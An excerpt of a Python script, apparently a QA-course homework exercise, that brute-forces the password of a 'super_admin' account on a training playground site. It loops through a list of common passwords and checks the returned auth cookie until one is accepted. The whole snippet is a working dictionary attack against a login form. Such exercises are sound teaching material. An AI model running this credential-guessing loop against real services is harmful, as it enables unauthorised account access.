...
passwords = [
    ...
    "baseball", "iloveyou", "123123", "1234567", "welcome", "login", "admin", "prince", "abc123",
...
for p in passwords:
    response = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data={'login': 'super_admin', 'password': p})
    auth_cookie = response.cookies.get("auth_cookie")
    if auth_cookie:
        link = requests.get("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies={'auth_cookie': auth_cookie})
        print(p)
        print(link.text)
        if link.text == "You are authorized":
            correct_password = p
            break
